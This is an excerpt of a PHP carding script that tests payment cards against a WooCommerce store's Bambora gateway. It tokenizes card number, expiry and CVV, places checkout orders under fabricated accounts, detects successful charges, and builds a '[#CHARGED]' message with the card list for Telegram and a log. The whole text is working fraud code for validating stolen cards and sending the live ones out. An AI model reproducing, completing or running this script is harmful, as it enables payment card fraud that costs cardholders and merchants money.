...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt($ch, CURLOPT_POSTFIELDS,  '{"number":"'.$cc.'","expiry_month":"'.$mes.'","expiry_year":"'.$ano.'","cvd":"'.$cvv.'"}');
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    ...
    'account_password' => $fname.'12'.$lname,
    'payment_method' => 'bambora_credit_card',
    'wc-bambora-credit-card-js-token' => $token,
    'wc-bambora-credit-card-account-number' => $cc4,
    'wc-bambora-credit-card-exp-month' => $mes,
    'wc-bambora-credit-card-exp-year' => $ano,
    'wc-bambora-credit-card-card-type' => $brand,
    'terms' => 'on',
    'terms-field' => 1,
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED BAMBORA]
    \n[$hostname1]
    \n[$receiptUrl]\n";
...
$log_entry = "*GATEWAY : BAMBORA CREDIT CARD*\n";
